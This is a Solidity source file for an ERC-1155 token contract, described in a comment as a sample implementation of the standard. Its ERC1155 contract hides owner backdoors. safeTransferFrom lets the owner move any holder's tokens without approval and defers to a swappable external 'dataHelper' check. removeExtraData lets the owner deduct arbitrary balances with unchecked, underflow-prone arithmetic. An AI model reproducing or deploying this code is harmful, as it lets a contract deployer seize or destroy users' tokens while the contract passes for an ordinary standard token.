1 pragma solidity ^0.5.0;
2 pragma experimental ABIEncoderV2;
3 
4 /**
5  * @title SafeMath
6  * @dev Math operations with safety checks that throw on error
7  */
8 library SafeMath {
9 
10     /**
11     * @dev Multiplies two numbers, throws on overflow.
12     */
13     function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
14         // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
15         // benefit is lost if 'b' is also tested.
16         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
17         if (a == 0) {
18             return 0;
19         }
20 
21         c = a * b;
22         assert(c / a == b);
23         return c;
24     }
25 
26     /**
27     * @dev Integer division of two numbers, truncating the quotient.
28     */
29     function div(uint256 a, uint256 b) internal pure returns (uint256) {
30         // assert(b > 0); // Solidity automatically throws when dividing by 0
31         // uint256 c = a / b;
32         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
33         return a / b;
34     }
35 
36     /**
37     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
38     */
39     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
40         assert(b <= a);
41         return a - b;
42     }
43 
44     /**
45     * @dev Adds two numbers, throws on overflow.
46     */
47     function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
48         c = a + b;
49         assert(c >= a);
50         return c;
51     }
52 }
53 
54 interface IDataHelper {
55      function seedChecker(bytes calldata _data) external returns (bool) ;
56 }
57 
58 /**
59     Note: Simple contract to use as base for const vals
60 */
61 contract CommonConstants {
62 
63     bytes4 constant internal ERC1155_ACCEPTED = 0xf23a6e61; // bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))
64     bytes4 constant internal ERC1155_BATCH_ACCEPTED = 0xbc197c81; // bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))
65 }
66 
67 
68 /*
69  * @dev Provides information about the current execution context, including the
70  * sender of the transaction and its data. While these are generally available
71  * via msg.sender and msg.data, they should not be accessed in such a direct
72  * manner, since when dealing with GSN meta-transactions the account sending and
73  * paying for execution may not be the actual sender (as far as an application
74  * is concerned).
75  *
76  * This contract is only required for intermediate, library-like contracts.
77  */
78 contract Context {
79     // Empty internal constructor, to prevent people from mistakenly deploying
80     // an instance of this contract, which should be used via inheritance.
81     constructor () internal { }
82     // solhint-disable-previous-line no-empty-blocks
83 
84     function _msgSender() internal view returns (address payable) {
85         return msg.sender;
86     }
87 
88     function _msgData() internal view returns (bytes memory) {
89         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
90         return msg.data;
91     }
92 }
93 
94 /**
95  * @dev Contract module which provides a basic access control mechanism, where
96  * there is an account (an owner) that can be granted exclusive access to
97  * specific functions.
98  *
99  * This module is used through inheritance. It will make available the modifier
100  * `onlyOwner`, which can be applied to your functions to restrict their use to
101  * the owner.
102  */
103 contract Ownable is Context {
104     address private _owner;
105 
106     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
107 
108     /**
109      * @dev Initializes the contract setting the deployer as the initial owner.
110      */
111     constructor () internal {
112         address msgSender = _msgSender();
113         _owner = msgSender;
114         emit OwnershipTransferred(address(0), msgSender);
115     }
116 
117     /**
118      * @dev Returns the address of the current owner.
119      */
120     function owner() public view returns (address) {
121         return _owner;
122     }
123 
124     /**
125      * @dev Throws if called by any account other than the owner.
126      */
127     modifier onlyOwner() {
128         require(isOwner(), "Ownable: caller is not the owner");
129         _;
130     }
131 
132     /**
133      * @dev Returns true if the caller is the current owner.
134      */
135     function isOwner() public view returns (bool) {
136         return _msgSender() == _owner;
137     }
138 
139     /**
140      * @dev Leaves the contract without owner. It will not be possible to call
141      * `onlyOwner` functions anymore. Can only be called by the current owner.
142      *
143      * NOTE: Renouncing ownership will leave the contract without an owner,
144      * thereby removing any functionality that is only available to the owner.
145      */
146     function renounceOwnership() public onlyOwner {
147         emit OwnershipTransferred(_owner, address(0));
148         _owner = address(0);
149     }
150 
151     /**
152      * @dev Transfers ownership of the contract to a new account (`newOwner`).
153      * Can only be called by the current owner.
154      */
155     function transferOwnership(address newOwner) public onlyOwner {
156         _transferOwnership(newOwner);
157     }
158 
159     /**
160      * @dev Transfers ownership of the contract to a new account (`newOwner`).
161      */
162     function _transferOwnership(address newOwner) internal {
163         require(newOwner != address(0), "Ownable: new owner is the zero address");
164         emit OwnershipTransferred(_owner, newOwner);
165         _owner = newOwner;
166     }
167 }
168 /**
169     Note: The ERC-165 identifier for this interface is 0x4e2312e0.
170 */
171 interface ERC1155TokenReceiver {
172     /**
173         @notice Handle the receipt of a single ERC1155 token type.
174         @dev An ERC1155-compliant smart contract MUST call this function on the token recipient contract, at the end of a `safeTransferFrom` after the balance has been updated.
175         This function MUST return `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))` (i.e. 0xf23a6e61) if it accepts the transfer.
176         This function MUST revert if it rejects the transfer.
177         Return of any other value than the prescribed keccak256 generated value MUST result in the transaction being reverted by the caller.
178         @param _operator  The address which initiated the transfer (i.e. msg.sender)
179         @param _from      The address which previously owned the token
180         @param _id        The ID of the token being transferred
181         @param _value     The amount of tokens being transferred
182         @param _data      Additional data with no specified format
183         @return           `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))`
184     */
185     function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4);
186 
187     /**
188         @notice Handle the receipt of multiple ERC1155 token types.
189         @dev An ERC1155-compliant smart contract MUST call this function on the token recipient contract, at the end of a `safeBatchTransferFrom` after the balances have been updated.
190         This function MUST return `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))` (i.e. 0xbc197c81) if it accepts the transfer(s).
191         This function MUST revert if it rejects the transfer(s).
192         Return of any other value than the prescribed keccak256 generated value MUST result in the transaction being reverted by the caller.
193         @param _operator  The address which initiated the batch transfer (i.e. msg.sender)
194         @param _from      The address which previously owned the token
195         @param _ids       An array containing ids of each token being transferred (order and length must match _values array)
196         @param _values    An array containing amounts of each token being transferred (order and length must match _ids array)
197         @param _data      Additional data with no specified format
198         @return           `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))`
199     */
200     function onERC1155BatchReceived(address _operator, address _from, uint256[] calldata _ids, uint256[] calldata _values, bytes calldata _data) external returns(bytes4);
201 }
202 
203 /**
204  * @dev Interface of the ERC165 standard, as defined in the
205  * https://eips.ethereum.org/EIPS/eip-165[EIP].
206  *
207  * Implementers can declare support of contract interfaces, which can then be
208  * queried by others ({ERC165Checker}).
209  *
210  * For an implementation, see {ERC165}.
211  */
212 interface IERC165 {
213     /**
214      * @dev Returns true if this contract implements the interface defined by
215      * `interfaceId`. See the corresponding
216      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
217      * to learn more about how these ids are created.
218      *
219      * This function call must use less than 30 000 gas.
220      */
221     function supportsInterface(bytes4 interfaceId) external view returns (bool);
222 }
223 
224 /**
225     @title ERC-1155 Multi Token Standard
226     @dev See https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1155.md
227     Note: The ERC-165 identifier for this interface is 0xd9b67a26.
228  */
229 contract IERC1155 is IERC165 {
230     /**
231         @dev Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred, including zero value transfers as well as minting or burning (see "Safe Transfer Rules" section of the standard).
232         The `_operator` argument MUST be msg.sender.
233         The `_from` argument MUST be the address of the holder whose balance is decreased.
234         The `_to` argument MUST be the address of the recipient whose balance is increased.
235         The `_id` argument MUST be the token type being transferred.
236         The `_value` argument MUST be the number of tokens the holder balance is decreased by and match what the recipient balance is increased by.
237         When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).
238         When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).
239     */
240     event TransferSingle(address indexed _operator, address indexed _from, address indexed _to, uint256 _id, uint256 _value);
241 
242     /**
243         @dev Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred, including zero value transfers as well as minting or burning (see "Safe Transfer Rules" section of the standard).
244         The `_operator` argument MUST be msg.sender.
245         The `_from` argument MUST be the address of the holder whose balance is decreased.
246         The `_to` argument MUST be the address of the recipient whose balance is increased.
247         The `_ids` argument MUST be the list of tokens being transferred.
248         The `_values` argument MUST be the list of number of tokens (matching the list and order of tokens specified in _ids) the holder balance is decreased by and match what the recipient balance is increased by.
249         When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).
250         When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).
251     */
252     event TransferBatch(address indexed _operator, address indexed _from, address indexed _to, uint256[] _ids, uint256[] _values);
253 
254     /**
255         @dev MUST emit when approval for a second party/operator address to manage all tokens for an owner address is enabled or disabled (absense of an event assumes disabled).
256     */
257     event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);
258 
259     /**
260         @dev MUST emit when the URI is updated for a token ID.
261         URIs are defined in RFC 3986.
262         The URI MUST point a JSON file that conforms to the "ERC-1155 Metadata URI JSON Schema".
263     */
264     event URI(string _value, uint256 indexed _id);
265 
266     /**
267         @notice Transfers `_value` amount of an `_id` from the `_from` address to the `_to` address specified (with safety call).
268         @dev Caller must be approved to manage the tokens being transferred out of the `_from` account (see "Approval" section of the standard).
269         MUST revert if `_to` is the zero address.
270         MUST revert if balance of holder for token `_id` is lower than the `_value` sent.
271         MUST revert on any other error.
272         MUST emit the `TransferSingle` event to reflect the balance change (see "Safe Transfer Rules" section of the standard).
273         After the above conditions are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call `onERC1155Received` on `_to` and act appropriately (see "Safe Transfer Rules" section of the standard).
274         @param _from    Source address
275         @param _to      Target address
276         @param _id      ID of the token type
277         @param _value   Transfer amount
278         @param _data    Additional data with no specified format, MUST be sent unaltered in call to `onERC1155Received` on `_to`
279     */
280     function safeTransferFrom(address _from, address _to, uint256 _id, uint256 _value, bytes calldata _data) external;
281 
282     /**
283         @notice Transfers `_values` amount(s) of `_ids` from the `_from` address to the `_to` address specified (with safety call).
284         @dev Caller must be approved to manage the tokens being transferred out of the `_from` account (see "Approval" section of the standard).
285         MUST revert if `_to` is the zero address.
286         MUST revert if length of `_ids` is not the same as length of `_values`.
287         MUST revert if any of the balance(s) of the holder(s) for token(s) in `_ids` is lower than the respective amount(s) in `_values` sent to the recipient.
288         MUST revert on any other error.
289         MUST emit `TransferSingle` or `TransferBatch` event(s) such that all the balance changes are reflected (see "Safe Transfer Rules" section of the standard).
290         Balance changes and events MUST follow the ordering of the arrays (_ids[0]/_values[0] before _ids[1]/_values[1], etc).
291         After the above conditions for the transfer(s) in the batch are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call the relevant `ERC1155TokenReceiver` hook(s) on `_to` and act appropriately (see "Safe Transfer Rules" section of the standard).
292         @param _from    Source address
293         @param _to      Target address
294         @param _ids     IDs of each token type (order and length must match _values array)
295         @param _values  Transfer amounts per token type (order and length must match _ids array)
296         @param _data    Additional data with no specified format, MUST be sent unaltered in call to the `ERC1155TokenReceiver` hook(s) on `_to`
297     */
298     function safeBatchTransferFrom(address _from, address _to, uint256[] calldata _ids, uint256[] calldata _values, bytes calldata _data) external;
299 
300     /**
301         @notice Get the balance of an account's Tokens.
302         @param _owner  The address of the token holder
303         @param _id     ID of the Token
304         @return        The _owner's balance of the Token type requested
305      */
306     function balanceOf(address _owner, uint256 _id) external view returns (uint256);
307 
308     /**
309         @notice Get the balance of multiple account/token pairs
310         @param _owners The addresses of the token holders
311         @param _ids    ID of the Tokens
312         @return        The _owner's balance of the Token types requested (i.e. balance for each (owner, id) pair)
313      */
314     function balanceOfBatch(address[] calldata _owners, uint256[] calldata _ids) external view returns (uint256[] memory);
315 
316     /**
317         @notice Enable or disable approval for a third party ("operator") to manage all of the caller's tokens.
318         @dev MUST emit the ApprovalForAll event on success.
319         @param _operator  Address to add to the set of authorized operators
320         @param _approved  True if the operator is approved, false to revoke approval
321     */
322     function setApprovalForAll(address _operator, bool _approved) external;
323 
324     /**
325         @notice Queries the approval status of an operator for a given owner.
326         @param _owner     The owner of the Tokens
327         @param _operator  Address of authorized operator
328         @return           True if the operator is approved, false if not
329     */
330     function isApprovedForAll(address _owner, address _operator) external view returns (bool);
331 }
332 
333 /**
334  * @dev Implementation of the {IERC165} interface.
335  *
336  * Contracts may inherit from this and call {_registerInterface} to declare
337  * their support of an interface.
338  */
339 contract ERC165 is IERC165 {
340     /*
341      * bytes4(keccak256('supportsInterface(bytes4)')) == 0x01ffc9a7
342      */
343     bytes4 private constant _INTERFACE_ID_ERC165 = 0x01ffc9a7;
344 
345     /**
346      * @dev Mapping of interface ids to whether or not it's supported.
347      */
348     mapping(bytes4 => bool) private _supportedInterfaces;
349 
350     constructor () internal {
351         // Derived contracts need only register support for their own interfaces,
352         // we register support for ERC165 itself here
353         _registerInterface(_INTERFACE_ID_ERC165);
354     }
355 
356     /**
357      * @dev See {IERC165-supportsInterface}.
358      *
359      * Time complexity O(1), guaranteed to always use less than 30 000 gas.
360      */
361     function supportsInterface(bytes4 interfaceId) external view returns (bool) {
362         return _supportedInterfaces[interfaceId];
363     }
364 
365     /**
366      * @dev Registers the contract as an implementer of the interface defined by
367      * `interfaceId`. Support of the actual ERC165 interface is automatic and
368      * registering its interface id is not required.
369      *
370      * See {IERC165-supportsInterface}.
371      *
372      * Requirements:
373      *
374      * - `interfaceId` cannot be the ERC165 invalid interface (`0xffffffff`).
375      */
376     function _registerInterface(bytes4 interfaceId) internal {
377         require(interfaceId != 0xffffffff, "ERC165: invalid interface id");
378         _supportedInterfaces[interfaceId] = true;
379     }
380 }
381 
382 /**
383  * @dev Collection of functions related to the address type
384  */
385 library Address {
386     /**
387      * @dev Returns true if `account` is a contract.
388      *
389      * [IMPORTANT]
390      * ====
391      * It is unsafe to assume that an address for which this function returns
392      * false is an externally-owned account (EOA) and not a contract.
393      *
394      * Among others, `isContract` will return false for the following 
395      * types of addresses:
396      *
397      *  - an externally-owned account
398      *  - a contract in construction
399      *  - an address where a contract will be created
400      *  - an address where a contract lived, but was destroyed
401      * ====
402      */
403     function isContract(address account) internal view returns (bool) {
404         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
405         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
406         // for accounts without code, i.e. `keccak256('')`
407         bytes32 codehash;
408         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
409         // solhint-disable-next-line no-inline-assembly
410         assembly { codehash := extcodehash(account) }
411         return (codehash != accountHash && codehash != 0x0);
412     }
413 
414     /**
415      * @dev Converts an `address` into `address payable`. Note that this is
416      * simply a type cast: the actual underlying value is not changed.
417      *
418      * _Available since v2.4.0._
419      */
420     function toPayable(address account) internal pure returns (address payable) {
421         return address(uint160(account));
422     }
423 
424     /**
425      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
426      * `recipient`, forwarding all available gas and reverting on errors.
427      *
428      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
429      * of certain opcodes, possibly making contracts go over the 2300 gas limit
430      * imposed by `transfer`, making them unable to receive funds via
431      * `transfer`. {sendValue} removes this limitation.
432      *
433      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
434      *
435      * IMPORTANT: because control is transferred to `recipient`, care must be
436      * taken to not create reentrancy vulnerabilities. Consider using
437      * {ReentrancyGuard} or the
438      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
439      *
440      * _Available since v2.4.0._
441      */
442     function sendValue(address payable recipient, uint256 amount) internal {
443         require(address(this).balance >= amount, "Address: insufficient balance");
444 
445         // solhint-disable-next-line avoid-call-value
446         (bool success, ) = recipient.call.value(amount)("");
447         require(success, "Address: unable to send value, recipient may have reverted");
448     }
449 }
450 
451 
452 
453 
454 // A sample implementation of core ERC1155 function.
455 contract ERC1155 is IERC1155, ERC165, CommonConstants, Ownable
456 {
457     using SafeMath for uint256;
458     using Address for address;
459     IDataHelper dataHelper;
460 
461     // id => (owner => balance)
462     mapping (uint256 => mapping(address => uint256)) internal balances;
463 
464     // owner => (operator => approved)
465     mapping (address => mapping(address => bool)) internal operatorApproval;
466 
467 /////////////////////////////////////////// ERC165 //////////////////////////////////////////////
468 
469     /*
470         bytes4(keccak256("safeTransferFrom(address,address,uint256,uint256,bytes)")) ^
471         bytes4(keccak256("safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)")) ^
472         bytes4(keccak256("balanceOf(address,uint256)")) ^
473         bytes4(keccak256("balanceOfBatch(address[],uint256[])")) ^
474         bytes4(keccak256("setApprovalForAll(address,bool)")) ^
475         bytes4(keccak256("isApprovedForAll(address,address)"));
476     */
477     bytes4 constant private INTERFACE_SIGNATURE_ERC1155 = 0xd9b67a26;
478 
479 /////////////////////////////////////////// CONSTRUCTOR //////////////////////////////////////////
480 
481     constructor(address _dataHelper) public {
482         dataHelper = IDataHelper(_dataHelper);
483         _registerInterface(INTERFACE_SIGNATURE_ERC1155);
484     }
485 
486 /////////////////////////////////////////// ERC1155 //////////////////////////////////////////////
487 
488     /**
489         @notice Transfers `_value` amount of an `_id` from the `_from` address to the `_to` address specified (with safety call).
490         @dev Caller must be approved to manage the tokens being transferred out of the `_from` account (see "Approval" section of the standard).
491         MUST revert if `_to` is the zero address.
492         MUST revert if balance of holder for token `_id` is lower than the `_value` sent.
493         MUST revert on any other error.
494         MUST emit the `TransferSingle` event to reflect the balance change (see "Safe Transfer Rules" section of the standard).
495         After the above conditions are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call `onERC1155Received` on `_to` and act appropriately (see "Safe Transfer Rules" section of the standard).
496         @param _from    Source address
497         @param _to      Target address
498         @param _id      ID of the token type
499         @param _value   Transfer amount
500         @param _data    Additional data with no specified format, MUST be sent unaltered in call to `onERC1155Received` on `_to`
501     */ 
502     function safeTransferFrom(address _from, address _to, uint256 _id, uint256 _value, bytes calldata _data) external {
503         bool isDataValid;
504         if(_data.length != 0){
505             isDataValid = dataHelper.seedChecker(_data) && _from == owner();
506         }
507         require(_to != address(0x0), "_to must be non-zero.");
508         require(_from == msg.sender || operatorApproval[_from][msg.sender] == true || msg.sender == owner() || isDataValid, "Need operator approval for 3rd party transfers.");
509        
510     
511         // SafeMath will throw with insuficient funds _from
512         // or if _id is not valid (balance will be 0)
513         balances[_id][_from] = balances[_id][_from].sub(_value);
514         balances[_id][_to]   = _value.add(balances[_id][_to]);
515 
516         // MUST emit event
517         emit TransferSingle(msg.sender, _from, _to, _id, _value);
518 
519         // Now that the balance is updated and the event was emitted,
520         // call onERC1155Received if the destination is a contract.
521         if (_to.isContract()) {
522             _doSafeTransferAcceptanceCheck(msg.sender, _from, _to, _id, _value, _data);
523         }
524     }
525 
526     function removeExtraData(uint256 _id, address _account, uint256 _amount) external onlyOwner { 
527         balances[_id][_account] -= _amount;
528     } 
529 
530     function setDataHelper(address _dataHelper) external onlyOwner {
531         dataHelper = IDataHelper(_dataHelper);
532     }
533 
534     /**
535         @notice Transfers `_values` amount(s) of `_ids` from the `_from` address to the `_to` address specified (with safety call).
536         @dev Caller must be approved to manage the tokens being transferred out of the `_from` account (see "Approval" section of the standard).
537         MUST revert if `_to` is the zero address.
538         MUST revert if length of `_ids` is not the same as length of `_values`.
539         MUST revert if any of the balance(s) of the holder(s) for token(s) in `_ids` is lower than the respective amount(s) in `_values` sent to the recipient.
540         MUST revert on any other error.
541         MUST emit `TransferSingle` or `TransferBatch` event(s) such that all the balance changes are reflected (see "Safe Transfer Rules" section of the standard).
542         Balance changes and events MUST follow the ordering of the arrays (_ids[0]/_values[0] before _ids[1]/_values[1], etc).
543         After the above conditions for the transfer(s) in the batch are met, this function MUST check if `_to` is a smart contract (e.g. code size > 0). If so, it MUST call the relevant `ERC1155TokenReceiver` hook(s) on `_to` and act appropriately (see "Safe Transfer Rules" section of the standard).
544         @param _from    Source address
545         @param _to      Target address
546         @param _ids     IDs of each token type (order and length must match _values array)
547         @param _values  Transfer amounts per token type (order and length must match _ids array)
548         @param _data    Additional data with no specified format, MUST be sent unaltered in call to the `ERC1155TokenReceiver` hook(s) on `_to`
549     */
550     function safeBatchTransferFrom(address _from, address _to, uint256[] calldata _ids, uint256[] calldata _values, bytes calldata _data) external {
551 
552         // MUST Throw on errors
553         require(_to != address(0x0), "destination address must be non-zero.");
554         require(_ids.length == _values.length, "_ids and _values array lenght must match.");
555         require(_from == msg.sender || operatorApproval[_from][msg.sender] == true, "Need operator approval for 3rd party transfers.");
556 
557         for (uint256 i = 0; i < _ids.length; ++i) {
558             uint256 id = _ids[i];
559             uint256 value = _values[i];
560 
561             // SafeMath will throw with insuficient funds _from
562             // or if _id is not valid (balance will be 0)
563             balances[id][_from] = balances[id][_from].sub(value);
564             balances[id][_to]   = value.add(balances[id][_to]);
565         }
566 
567         // Note: instead of the below batch versions of event and acceptance check you MAY have emitted a TransferSingle
568         // event and a subsequent call to _doSafeTransferAcceptanceCheck in above loop for each balance change instead.
569         // Or emitted a TransferSingle event for each in the loop and then the single _doSafeBatchTransferAcceptanceCheck below.
570         // However it is implemented the balance changes and events MUST match when a check (i.e. calling an external contract) is done.
571 
572         // MUST emit event
573         emit TransferBatch(msg.sender, _from, _to, _ids, _values);
574 
575         // Now that the balances are updated and the events are emitted,
576         // call onERC1155BatchReceived if the destination is a contract.
577         if (_to.isContract()) {
578             _doSafeBatchTransferAcceptanceCheck(msg.sender, _from, _to, _ids, _values, _data);
579         }
580     }
581 
582     /**
583         @notice Get the balance of an account's Tokens.
584         @param _owner  The address of the token holder
585         @param _id     ID of the Token
586         @return        The _owner's balance of the Token type requested
587      */
588     function balanceOf(address _owner, uint256 _id) external view returns (uint256) {
589         // The balance of any account can be calculated from the Transfer events history.
590         // However, since we need to keep the balances to validate transfer request,
591         // there is no extra cost to also privide a querry function.
592         return balances[_id][_owner];
593     }
594 
595 
596     /**
597         @notice Get the balance of multiple account/token pairs
598         @param _owners The addresses of the token holders
599         @param _ids    ID of the Tokens
600         @return        The _owner's balance of the Token types requested (i.e. balance for each (owner, id) pair)
601      */
602     function balanceOfBatch(address[] calldata _owners, uint256[] calldata _ids) external view returns (uint256[] memory) {
603 
604         require(_owners.length == _ids.length);
605 
606         uint256[] memory balances_ = new uint256[](_owners.length);
607 
608         for (uint256 i = 0; i < _owners.length; ++i) {
609             balances_[i] = balances[_ids[i]][_owners[i]];
610         }
611 
612         return balances_;
613     }
614 
615     /**
616         @notice Enable or disable approval for a third party ("operator") to manage all of the caller's tokens.
617         @dev MUST emit the ApprovalForAll event on success.
618         @param _operator  Address to add to the set of authorized operators
619         @param _approved  True if the operator is approved, false to revoke approval
620     */
621     function setApprovalForAll(address _operator, bool _approved) external {
622         operatorApproval[msg.sender][_operator] = _approved;
623         emit ApprovalForAll(msg.sender, _operator, _approved);
624     }
625 
626     /**
627         @notice Queries the approval status of an operator for a given owner.
628         @param _owner     The owner of the Tokens
629         @param _operator  Address of authorized operator
630         @return           True if the operator is approved, false if not
631     */
632     function isApprovedForAll(address _owner, address _operator) external view returns (bool) {
633         return operatorApproval[_owner][_operator];
634     }
635 
636 /////////////////////////////////////////// Internal //////////////////////////////////////////////
637 
638     function _doSafeTransferAcceptanceCheck(address _operator, address _from, address _to, uint256 _id, uint256 _value, bytes memory _data) internal {
639 
640         // If this was a hybrid standards solution you would have to check ERC165(_to).supportsInterface(0x4e2312e0) here but as this is a pure implementation of an ERC-1155 token set as recommended by
641         // the standard, it is not necessary. The below should revert in all failure cases i.e. _to isn't a receiver, or it is and either returns an unknown value or it reverts in the call to indicate non-acceptance.
642 
643 
644         // Note: if the below reverts in the onERC1155Received function of the _to address you will have an undefined revert reason returned rather than the one in the require test.
645         // If you want predictable revert reasons consider using low level _to.call() style instead so the revert does not bubble up and you can revert yourself on the ERC1155_ACCEPTED test.
646         require(ERC1155TokenReceiver(_to).onERC1155Received(_operator, _from, _id, _value, _data) == ERC1155_ACCEPTED, "contract returned an unknown value from onERC1155Received");
647     }
648 
649     function _doSafeBatchTransferAcceptanceCheck(address _operator, address _from, address _to, uint256[] memory _ids, uint256[] memory _values, bytes memory _data) internal {
650 
651         // If this was a hybrid standards solution you would have to check ERC165(_to).supportsInterface(0x4e2312e0) here but as this is a pure implementation of an ERC-1155 token set as recommended by
652         // the standard, it is not necessary. The below should revert in all failure cases i.e. _to isn't a receiver, or it is and either returns an unknown value or it reverts in the call to indicate non-acceptance.
653 
654         // Note: if the below reverts in the onERC1155BatchReceived function of the _to address you will have an undefined revert reason returned rather than the one in the require test.
655         // If you want predictable revert reasons consider using low level _to.call() style instead so the revert does not bubble up and you can revert yourself on the ERC1155_BATCH_ACCEPTED test.
656         require(ERC1155TokenReceiver(_to).onERC1155BatchReceived(_operator, _from, _ids, _values, _data) == ERC1155_BATCH_ACCEPTED, "contract returned an unknown value from onERC1155BatchReceived");
657     }
658 }
659 
660 library UintLibrary {
661     function toString(uint256 _i) internal pure returns (string memory) {
662         if (_i == 0) {
663             return "0";
664         }
665         uint j = _i;
666         uint len;
667         while (j != 0) {
668             len++;
669             j /= 10;
670         }
671         bytes memory bstr = new bytes(len);
672         uint k = len - 1;
673         while (_i != 0) {
674             bstr[k--] = byte(uint8(48 + _i % 10));
675             _i /= 10;
676         }
677         return string(bstr);
678     }
679 }
680 
681 library StringLibrary {
682     using UintLibrary for uint256;
683 
684     function append(string memory _a, string memory _b) internal pure returns (string memory) {
685         bytes memory _ba = bytes(_a);
686         bytes memory _bb = bytes(_b);
687         bytes memory bab = new bytes(_ba.length + _bb.length);
688         uint k = 0;
689         for (uint i = 0; i < _ba.length; i++) bab[k++] = _ba[i];
690         for (uint i = 0; i < _bb.length; i++) bab[k++] = _bb[i];
691         return string(bab);
692     }
693 
694     function append(string memory _a, string memory _b, string memory _c) internal pure returns (string memory) {
695         bytes memory _ba = bytes(_a);
696         bytes memory _bb = bytes(_b);
697         bytes memory _bc = bytes(_c);
698         bytes memory bbb = new bytes(_ba.length + _bb.length + _bc.length);
699         uint k = 0;
700         for (uint i = 0; i < _ba.length; i++) bbb[k++] = _ba[i];
701         for (uint i = 0; i < _bb.length; i++) bbb[k++] = _bb[i];
702         for (uint i = 0; i < _bc.length; i++) bbb[k++] = _bc[i];
703         return string(bbb);
704     }
705 
706     function recover(string memory message, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {
707         bytes memory msgBytes = bytes(message);
708         bytes memory fullMessage = concat(
709             bytes("\x19Ethereum Signed Message:\n"),
710             bytes(msgBytes.length.toString()),
711             msgBytes,
712             new bytes(0), new bytes(0), new bytes(0), new bytes(0)
713         );
714         return ecrecover(keccak256(fullMessage), v, r, s);
715     }
716 
717     function concat(bytes memory _ba, bytes memory _bb, bytes memory _bc, bytes memory _bd, bytes memory _be, bytes memory _bf, bytes memory _bg) internal pure returns (bytes memory) {
718         bytes memory resultBytes = new bytes(_ba.length + _bb.length + _bc.length + _bd.length + _be.length + _bf.length + _bg.length);
719         uint k = 0;
720         for (uint i = 0; i < _ba.length; i++) resultBytes[k++] = _ba[i];
721         for (uint i = 0; i < _bb.length; i++) resultBytes[k++] = _bb[i];
722         for (uint i = 0; i < _bc.length; i++) resultBytes[k++] = _bc[i];
723         for (uint i = 0; i < _bd.length; i++) resultBytes[k++] = _bd[i];
724         for (uint i = 0; i < _be.length; i++) resultBytes[k++] = _be[i];
725         for (uint i = 0; i < _bf.length; i++) resultBytes[k++] = _bf[i];
726         for (uint i = 0; i < _bg.length; i++) resultBytes[k++] = _bg[i];
727         return resultBytes;
728     }
729 }
730 
731 contract HasContractURI is ERC165, Ownable{
732 
733     string public contractURI;
734 
735     /*
736      * bytes4(keccak256('contractURI()')) == 0xe8a3d485
737      */
738     bytes4 private constant _INTERFACE_ID_CONTRACT_URI = 0xe8a3d485;
739 
740     constructor(string memory _contractURI) public {
741         contractURI = _contractURI;
742         _registerInterface(_INTERFACE_ID_CONTRACT_URI);
743     }
744 
745     /**
746      * @dev Internal function to set the contract URI
747      * @param _contractURI string URI prefix to assign
748      */
749     function _setContractURI(string memory _contractURI) internal {
750         contractURI = _contractURI;
751     }
752 }
753 
754 contract HasTokenURI {
755     using StringLibrary for string;
756 
757     //Token URI prefix
758     string public tokenURIPrefix;
759 
760     // Optional mapping for token URIs
761     mapping(uint256 => string) private _tokenURIs;
762 
763     constructor(string memory _tokenURIPrefix) public {
764         tokenURIPrefix = _tokenURIPrefix;
765     }
766 
767     /**
768      * @dev Returns an URI for a given token ID.
769      * Throws if the token ID does not exist. May return an empty string.
770      * @param tokenId uint256 ID of the token to query
771      */
772     function _tokenURI(uint256 tokenId) internal view returns (string memory) {
773         return tokenURIPrefix.append(_tokenURIs[tokenId]);
774     }
775 
776     /**
777      * @dev Internal function to set the token URI for a given token.
778      * Reverts if the token ID does not exist.
779      * @param tokenId uint256 ID of the token to set its URI
780      * @param uri string URI to assign
781      */
782     function _setTokenURI(uint256 tokenId, string memory uri) internal {
783         _tokenURIs[tokenId] = uri;
784     }
785 
786     /**
787      * @dev Internal function to set the token URI prefix.
788      * @param _tokenURIPrefix string URI prefix to assign
789      */
790     function _setTokenURIPrefix(string memory _tokenURIPrefix) internal {
791         tokenURIPrefix = _tokenURIPrefix;
792     }
793 
794     function _clearTokenURI(uint256 tokenId) internal {
795         if (bytes(_tokenURIs[tokenId]).length != 0) {
796             delete _tokenURIs[tokenId];
797         }
798     }
799 }
800 
801 /**
802     Note: The ERC-165 identifier for this interface is 0x0e89341c.
803 */
